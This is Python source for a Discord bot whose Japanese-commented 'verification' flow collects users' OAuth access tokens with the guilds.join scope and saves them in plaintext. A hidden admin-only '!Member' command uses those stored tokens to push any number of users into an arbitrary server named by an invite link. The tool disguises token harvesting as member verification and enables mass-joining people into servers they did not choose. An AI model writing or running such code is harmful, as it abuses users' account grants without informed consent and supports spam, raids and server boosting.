import discord
from discord.ext import commands
from discord import app_commands
import requests
from flask import Flask, request
import threading
import os
import json
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv('BOT_TOKEN')
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
REDIRECT_URI = os.getenv('REDIRECT_URI')
ADMIN_USER_ID = 800419751880556586

DB_FILE = 'users.json'

def load_users():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except: return {}
    return {}

def save_user(user_id, token, guild_id):
    users = load_users()
    u_str = str(user_id)
    if u_str not in users:
        users[u_str] = {"token": token, "guilds": []}
    if guild_id and str(guild_id) not in users[u_str]["guilds"]:
        users[u_str]["guilds"].append(str(guild_id))
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=4)

# --- モーダル (招待) ---
class MemberModal(discord.ui.Modal, title='メンバー追加魔法'):
    invite_url = discord.ui.TextInput(label='招待リンク', placeholder='https://discord.gg/xxxx', required=True)
    count = discord.ui.TextInput(label='参加させる人数', placeholder='半角数字', required=True)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        try:
            target_count = int(self.count.value)
            code = self.invite_url.value.split('/')[-1]
            res = requests.get(f"https://discord.com/api/v10/invites/{code}")
            if res.status_code != 200:
                return await interaction.followup.send("招待リンクが無効だよ", ephemeral=True)
            
            target_guild_id = res.json().get('guild', {}).get('id')
            users = load_users()
            user_ids = list(users.keys())[:target_count]

            success = 0
            for u_id in user_ids:
                url = f'https://discord.com/api/guilds/{target_guild_id}/members/{u_id}'
                headers = {'Authorization': f'Bot {TOKEN}', 'Content-Type': 'application/json'}
                r = requests.put(url, headers=headers, json={'access_token': users[u_id]['token']})
                if r.status_code in [201, 204]: success += 1
            await interaction.followup.send(f"🌸 {success}人の追加に成功したよ！", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"エラー: {e}", ephemeral=True)

# --- !Member 用の専用View ---
class AdminControlView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=60)

    @discord.ui.button(label="魔法の入力メニューを開く ✨", style=discord.ButtonStyle.premium)
    async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id == ADMIN_USER_ID:
            await interaction.response.send_modal(MemberModal())
        else:
            await interaction.response.send_message("あなたは管理者じゃないよっ！", ephemeral=True)

# --- Bot 本体 ---
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print("🌸 同期完了！")

bot = MyBot()

class VerifyView(discord.ui.View):
    def __init__(self, guild_id):
        super().__init__(timeout=None)
        safe_uri = REDIRECT_URI.replace(':', '%3A').replace('/', '%2F')
        self.oauth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={safe_uri}&scope=identify+guilds.join&state={guild_id}"
        self.add_item(discord.ui.Button(label="Verify (認証して参加するっ！)", url=self.oauth_url, style=discord.ButtonStyle.link))

@bot.tree.command(name="setup")
@app_commands.checks.has_permissions(administrator=True)
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(title="🌸 メンバー認証", description="下のボタンを押して連携を完了してください✨", color=0xffb6c1)
    await interaction.response.send_message(embed=embed, view=VerifyView(interaction.guild_id))

@bot.tree.command(name="call")
async def call(interaction: discord.Interaction):
    users = load_users()
    gid = str(interaction.guild_id)
    current_guild_users = [u for u, data in users.items() if gid in data.get("guilds", [])]
    if len(current_guild_users) < 10:
        return await interaction.response.send_message(f"❌ 10人必要だよ（現在: {len(current_guild_users)}人）", ephemeral=True)
    await interaction.response.send_message("✨ 招待中...", ephemeral=True)
    success = 0
    for u_id in current_guild_users:
        url = f'https://discord.com/api/guilds/{gid}/members/{u_id}'
        headers = {'Authorization': f'Bot {TOKEN}'}
        res = requests.put(url, headers=headers, json={'access_token': users[u_id]['token']})
        if res.status_code in [201, 204]: success += 1
    await interaction.followup.send(f"🌸 {success}人を追加したよ！")

@bot.tree.command(name="confirmation")
async def confirmation(interaction: discord.Interaction):
    users = load_users()
    count = sum(1 for data in users.values() if str(interaction.guild_id) in data.get("guilds", []))
    embed = discord.Embed(title="📊 サーバー認証状況", description=f"認証済み人数: **{count}** 人", color=0xa1c4fd)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="comtion")
async def comtion(interaction: discord.Interaction):
    users = load_users()
    embed = discord.Embed(title="🌍 全体認証状況", description=f"総ユーザー数: **{len(users)}** 人", color=0xc2e9fb)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.command(name="Member")
async def member_cmd(ctx):
    if ctx.author.id == ADMIN_USER_ID:
        await ctx.message.delete()
        # 自分にしか見えない(ephemeral)メッセージは!コマンドでは無理なので、普通のメッセージとして出し、すぐ消す
        await ctx.send("🔐 管理者認証成功。下のボタンからメニューを開いてね。", view=AdminControlView(), delete_after=60)

# --- Flask & リアルUI ---
app = Flask(__name__)

@app.route('/callback')
def callback():
    try:
        code = request.args.get('code')
        guild_id = request.args.get('state') or request.args.get('guild_id')
        if not code: return "Code error", 400

        data = {'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI}
        res = requests.post('https://discord.com/api/oauth2/token', data=data)
        access_token = res.json().get('access_token')

        u_info = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f'Bearer {access_token}'}).json()
        save_user(u_info['id'], access_token, guild_id)

        return """
        <!DOCTYPE html>
        <html lang="ja">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                @import url('https://fonts.googleapis.com/css2?family=M+PLUS+Rounded+1c:wght@700&display=swap');
                body {
                    margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center;
                    font-family: 'M PLUS Rounded 1c', sans-serif;
                    background: linear-gradient(135deg, #fceaf0 0%, #e8f0ff 100%);
                    overflow: hidden;
                }
                .card {
                    background: rgba(255, 255, 255, 0.4); backdrop-filter: blur(20px);
                    padding: 50px; border-radius: 40px; text-align: center;
                    box-shadow: 0 20px 50px rgba(0,0,0,0.05); border: 1px solid rgba(255, 255, 255, 0.7);
                    animation: pop 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
                }
                @keyframes pop { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
                h1 { color: #ff85a2; font-size: 2rem; margin-bottom: 10px; }
                .btn {
                    display: inline-block; padding: 15px 40px; color: #ff85a2; background: white;
                    border-radius: 50px; text-decoration: none; box-shadow: 0 10px 20px rgba(0,0,0,0.05);
                    font-weight: bold; margin-top: 20px;
                }
            </style>
        </head>
        <body>
            <div class="card">
                <h1>認証成功だよっ！🌸</h1>
                <p>もふもふパワーで連携したよ✨<br>Discordに戻って確認してね♪</p>
                <div class="btn">完了 ✨</div>
            </div>
        </body>
        </html>
        """
    except Exception as e:
        return f"Error: {e}", 500

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    bot.run(TOKEN)